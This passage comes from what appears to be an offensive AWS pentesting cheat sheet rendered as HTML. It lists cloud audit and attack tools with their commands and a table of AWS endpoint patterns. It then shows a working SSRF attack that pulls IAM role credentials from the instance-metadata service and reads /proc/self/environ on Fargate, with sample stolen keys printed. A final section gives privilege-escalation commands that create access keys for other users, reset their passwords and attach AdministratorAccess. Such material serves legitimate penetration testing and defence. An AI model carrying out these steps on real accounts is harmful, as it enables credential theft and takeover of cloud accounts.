  </span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">scout.py</span><span class="w"> </span><span class="nx">aws</span><span class="w"> </span><span class="nt">--access-keys</span><span class="w"> </span><span class="nt">--access-key-id</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">AKIAIOSFODNN7EXAMPLE</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--secret-access-key</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--session-token</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">token</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">scout.py</span><span class="w"> </span><span class="nx">azure</span><span class="w"> </span><span class="nt">--cli</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/nccgroup/s3_objects_check">s3_objects_check</a> - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/nccgroup/s3_objects_check</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">venv</span><span class="w"> </span><span class="nx">env</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">source</span><span class="w"> </span><span class="nx">env/bin/activate</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">requirements.txt</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">s3-objects-check.py</span><span class="w"> </span><span class="nt">-h</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">s3-objects-check.py</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">whitebox-profile</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">blackbox-profile</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/salesforce/cloudsplaining">cloudsplaining</a> - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">pip3</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="nx">cloudsplaining</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">cloudsplaining</span><span class="w"> </span><span class="nx">download</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">myawsprofile</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">cloudsplaining</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nt">--input-file</span><span class="w"> </span><span class="nx">default.json</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/carnal0wnage/weirdAAL/wiki">weirdAAL</a> - AWS Attack Library
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">python3</span><span class="w"> </span><span class="nx">weirdAAL.py</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">ec2_describe_instances</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">demo</span><span class="w">
  </span><span class="n">python3</span><span class="w"> </span><span class="nx">weirdAAL.py</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">lambda_get_account_settings</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">demo</span><span class="w">
  </span><span class="n">python3</span><span class="w"> </span><span class="nx">weirdAAL.py</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">lambda_get_function</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s1">'MY_LAMBDA_FUNCTION'</span><span class="p">,</span><span class="s1">'us-west-2'</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">yolo</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/duo-labs/cloudmapper.git">cloudmapper</a> - CloudMapper helps you analyze your Amazon Web Services (AWS) environments
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/duo-labs/cloudmapper.git</span><span class="w">
  </span><span class="c"># sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli</span><span class="w">
  </span><span class="c"># You may additionally need "build-essential"</span><span class="w">
  </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">autoconf</span><span class="w"> </span><span class="nx">automake</span><span class="w"> </span><span class="nx">libtool</span><span class="w"> </span><span class="nx">python3.7-dev</span><span class="w"> </span><span class="nx">python3-tk</span><span class="w"> </span><span class="nx">jq</span><span class="w"> </span><span class="nx">awscli</span><span class="w">
  </span><span class="n">pipenv</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">--skip-lock</span><span class="w">
  </span><span class="n">pipenv</span><span class="w"> </span><span class="nx">shell</span><span class="w">
  </span><span class="n">report:</span><span class="w"> </span><span class="nx">Generate</span><span class="w"> </span><span class="nx">HTML</span><span class="w"> </span><span class="nx">report.</span><span class="w"> </span><span class="nx">Includes</span><span class="w"> </span><span class="nx">summary</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">audit</span><span class="w"> </span><span class="nx">findings.</span><span class="w">
  </span><span class="n">iam_report:</span><span class="w"> </span><span class="nx">Generate</span><span class="w"> </span><span class="nx">HTML</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">IAM</span><span class="w"> </span><span class="nx">information</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">account.</span><span class="w">
  </span><span class="n">audit:</span><span class="w"> </span><span class="nx">Check</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">potential</span><span class="w"> </span><span class="nx">misconfigurations.</span><span class="w">
  </span><span class="n">collect:</span><span class="w"> </span><span class="nx">Collect</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">about</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">account.</span><span class="w">
  </span><span class="n">find_admins:</span><span class="w"> </span><span class="nx">Look</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">IAM</span><span class="w"> </span><span class="nx">policies</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">identify</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">roles</span><span class="p">,</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">principals</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">specific</span><span class="w"> </span><span class="nx">privileges</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://labs.bishopfox.com/dufflebag">dufflebag</a> - Find secrets that are accidentally exposed via Amazon EBS’s “public” mode</li>
</ul>

<h2 id="aws-patterns">AWS Patterns</h2>
<p>| Service                                  | URL |
|————-|——–|
| s3 | https://{user_provided}.s3.amazonaws.com |
| cloudfront | https://{random_id}.cloudfront.net |
| ec2 | ec2-{ip-seperated}.compute-1.amazonaws.com |
| es | https://{user_provided}-{random_id}.{region}.es.amazonaws.com |
| elb |	http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 |
| elbv2 | https://{user_provided}-{random_id}.{region}.elb.amazonaws.com |
| rds | mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 |
| rds | postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 |
| route 53 | {user_provided} |
| execute-api | https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} |
| cloudsearch | https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com |
| transfer | sftp://s-{random_id}.server.transfer.{region}.amazonaws.com |
| iot | mqtt://{random_id}.iot.{region}.amazonaws.com:8883 |
| iot | https://{random_id}.iot.{region}.amazonaws.com:8443 |
| iot | https://{random_id}.iot.{region}.amazonaws.com:443 |
| mq | https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 |
| mq | ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 |
| kafka | b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com |
| kafka | {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com |
| cloud9 | https://{random_id}.vfs.cloud9.{region}.amazonaws.com |
| mediastore | https://{random_id}.data.mediastore.{region}.amazonaws.com |
| kinesisvideo | https://{random_id}.kinesisvideo.{region}.amazonaws.com |
| mediaconvert | https://{random_id}.mediaconvert.{region}.amazonaws.com |
| mediapackage | https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel |</p>

<h2 id="aws---metadata-ssrf">AWS - Metadata SSRF</h2>

<blockquote>
  <p>AWS released additional security defences against the attack.</p>
</blockquote>

<p>:warning: Only working with IMDSv1.
Enabling IMDSv2 : <code class="language-plaintext highlighter-rouge">aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required</code>.</p>

<p>In order to usr IMDSv2 you must provide a token.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">export</span><span class="w"> </span><span class="nx">TOKEN</span><span class="o">=</span><span class="err">`</span><span class="n">curl</span><span class="w"> </span><span class="nt">-X</span><span class="w"> </span><span class="nx">PUT</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">"X-aws-ec2-metadata-token-ttl-seconds: 21600"</span><span class="w"> </span><span class="s2">"http://169.254.169.254/latest/api/token"</span><span class="se">`
</span><span class="nx">curl</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">"X-aws-ec2-metadata-token:</span><span class="nv">$TOKEN</span><span class="s2">"</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="s2">"http://169.254.169.254/latest/meta-data"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="method-for-elastic-cloud-compute-ec2">Method for Elastic Cloud Compute (EC2)</h3>

<p>Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/</p>

<ol>
  <li>Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">ami-id</span><span class="w">
 </span><span class="nx">ami-launch-index</span><span class="w">
 </span><span class="n">ami-manifest-path</span><span class="w">
 </span><span class="nx">block-device-mapping/</span><span class="w">
 </span><span class="n">events/</span><span class="w">
 </span><span class="nx">hostname</span><span class="w">
 </span><span class="n">iam/</span><span class="w">
 </span><span class="nx">identity-credentials/</span><span class="w">
 </span><span class="n">instance-action</span><span class="w">
 </span><span class="nx">instance-id</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/</li>
  <li>Extract the role’s temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="s2">"Code"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"Success"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"LastUpdated"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"2019-07-31T23:08:10Z"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"Type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"AWS-HMAC"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"AccessKeyId"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ASIA54BL6PJR37YOEP67"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"SecretAccessKey"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"Token"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"Expiration"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"2019-08-01T05:20:30Z"</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<h3 id="method-for-container-service-fargate">Method for Container Service (Fargate)</h3>

<ol>
  <li>Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">JAVA_ALPINE_VERSION</span><span class="o">=</span><span class="mf">8.212</span><span class="o">.</span><span class="nf">04-r0</span><span class="w">
 </span><span class="n">HOSTNAME</span><span class="o">=</span><span class="n">bbb3c57a0ed3SHLVL</span><span class="o">=</span><span class="mi">1</span><span class="n">PORT</span><span class="o">=</span><span class="mi">8443</span><span class="n">HOME</span><span class="o">=</span><span class="n">/root</span><span class="w">
 </span><span class="nx">AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</span><span class="o">=</span><span class="n">/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447</span><span class="w">
 </span><span class="nx">AWS_EXECUTION_ENV</span><span class="o">=</span><span class="n">AWS_ECS_FARGATEMVN_VER</span><span class="o">=</span><span class="mf">3.3</span><span class="o">.</span><span class="nf">9JAVA_VERSION</span><span class="o">=</span><span class="mi">8</span><span class="n">u212AWS_DEFAULT_REGION</span><span class="o">=</span><span class="n">us-west-2</span><span class="w">
 </span><span class="nx">ECS_CONTAINER_METADATA_URI</span><span class="o">=</span><span class="n">http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH</span><span class="o">=</span><span class="n">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG</span><span class="o">=</span><span class="n">C.UTF-8AWS_REGION</span><span class="o">=</span><span class="n">us-west-2Tag</span><span class="o">=</span><span class="mi">48111</span><span class="n">bbJAVA_HOME</span><span class="o">=</span><span class="n">/usr/lib/jvm/java-1.8-openjdk/jreM2</span><span class="o">=</span><span class="n">/usr/lib/mvn/binPWD</span><span class="o">=</span><span class="n">/appM2_HOME</span><span class="o">=</span><span class="n">/usr/lib/mvnLD_LIBRARY_PATH</span><span class="o">=</span><span class="n">/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="p">{</span><span class="w">
     </span><span class="s2">"RoleArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::953574914659:role/awesome-waf-role"</span><span class="p">,</span><span class="w">
     </span><span class="s2">"AccessKeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ASIA54BL6PJR2L75XHVS"</span><span class="p">,</span><span class="w">
     </span><span class="s2">"SecretAccessKey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt"</span><span class="p">,</span><span class="w">
     </span><span class="s2">"Token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ=="</span><span class="p">,</span><span class="w">
     </span><span class="s2">"Expiration"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2019-09-18T04:05:59Z"</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<h3 id="aws-api-calls-that-return-credentials">AWS API calls that return credentials</h3>

<ul>
  <li>chime:createapikey</li>
  <li><a href="https://docs.aws.amazon.com/codepipeline/latest/APIReference/API_PollForJobs.html">codepipeline:pollforjobs</a></li>
  <li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdToken.html">cognito-identity:getopenidtoken</a></li>
  <li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdTokenForDeveloperIdentity.html">cognito-identity:getopenidtokenfordeveloperidentity</a></li>
  <li><a href="https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetCredentialsForIdentity.html">cognito-identity:getcredentialsforidentity</a></li>
  <li><a href="https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html">connect:getfederationtoken</a></li>
  <li><a href="https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html">connect:getfederationtokens</a></li>
  <li><a href="https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_GetAuthorizationToken.html">ecr:getauthorizationtoken</a></li>
  <li><a href="https://docs.aws.amazon.com/gamelift/latest/apireference/API_RequestUploadCredentials.html">gamelift:requestuploadcredentials</a></li>
  <li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html">iam:createaccesskey</a></li>
  <li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateLoginProfile.html">iam:createloginprofile</a></li>
  <li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateServiceSpecificCredential.html">iam:createservicespecificcredential</a></li>
  <li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResetServiceSpecificCredential.html">iam:resetservicespecificcredential</a></li>
  <li><a href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAccessKey.html">iam:updateaccesskey</a></li>
  <li><a href="https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetInstanceAccessDetails.html">lightsail:getinstanceaccessdetails</a></li>
  <li><a href="https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetRelationalDatabaseMasterUserPassword.html">lightsail:getrelationaldatabasemasteruserpassword</a></li>
  <li><a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html">rds-db:connect</a></li>
  <li><a href="https://docs.aws.amazon.com/redshift/latest/APIReference/API_GetClusterCredentials.html">redshift:getclustercredentials</a></li>
  <li><a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_GetRoleCredentials.html">sso:getrolecredentials</a></li>
  <li><a href="https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-credentials.html">mediapackage:rotatechannelcredentials</a></li>
  <li><a href="https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-ingest_endpoints-ingest_endpoint_id-credentials.html">mediapackage:rotateingestendpointcredentials</a></li>
  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html">sts:assumerole</a></li>
  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-saml.html">sts:assumerolewithsaml</a></li>
  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">sts:assumerolewithwebidentity</a></li>
  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-federation-token.html">sts:getfederationtoken</a></li>
  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-session-token.html">sts:getsessiontoken</a></li>
</ul>

<h2 id="aws---shadow-admin">AWS - Shadow Admin</h2>

<h3 id="admin-equivalent-permission">Admin equivalent permission</h3>

<ul>
  <li>
    <p>AdministratorAccess</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="s2">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
  </span><span class="s2">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>ec2:AssociateIamInstanceProfile</p>
  </li>
  <li><strong>iam:CreateAccessKey</strong>iam:CreateAccessKey : create a new access key to another IAM admin account
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">create-access-key</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">target_user</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:CreateLoginProfile</strong> : add a new password-based login profile, set a new password for an entity and impersonate it
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">create-login-profile</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">target_user</span><span class="w"> </span><span class="err">–</span><span class="nx">password</span><span class="w"> </span><span class="s1">'|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^('</span><span class="w"> </span><span class="err">–</span><span class="nx">no-password-reset-required</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:UpdateLoginProfile</strong> : reset other IAM users’ login passwords.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">update-login-profile</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">target_user</span><span class="w"> </span><span class="err">–</span><span class="nx">password</span><span class="w"> </span><span class="s1">'|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^('</span><span class="w"> </span><span class="err">–</span><span class="nx">no-password-reset-required</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:AttachUserPolicy</strong>, <strong>iam:AttachGroupPolicy</strong> or <strong>iam:AttachRolePolicy</strong> : attach existing admin policy to any other entity he currently possesses
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">attach-user-policy</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">my_username</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-arn</span><span class="w"> </span><span class="nx">arn:aws:iam::aws:policy/AdministratorAccess</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">attach-user-policy</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">my_username</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-arn</span><span class="w"> </span><span class="nx">arn:aws:iam::aws:policy/AdministratorAccess</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">attach-role-policy</span><span class="w"> </span><span class="err">–</span><span class="nx">role-name</span><span class="w"> </span><span class="nx">role_i_can_assume</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-arn</span><span class="w"> </span><span class="nx">arn:aws:iam::aws:policy/AdministratorAccess</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:PutUserPolicy</strong>, <strong>iam:PutGroupPolicy</strong> or <strong>iam:PutRolePolicy</strong> : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">put-user-policy</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">my_username</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-name</span><span class="w"> </span><span class="nx">my_inline_policy</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-document</span><span class="w"> </span><span class="nx">file://path/to/administrator/policy.json</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
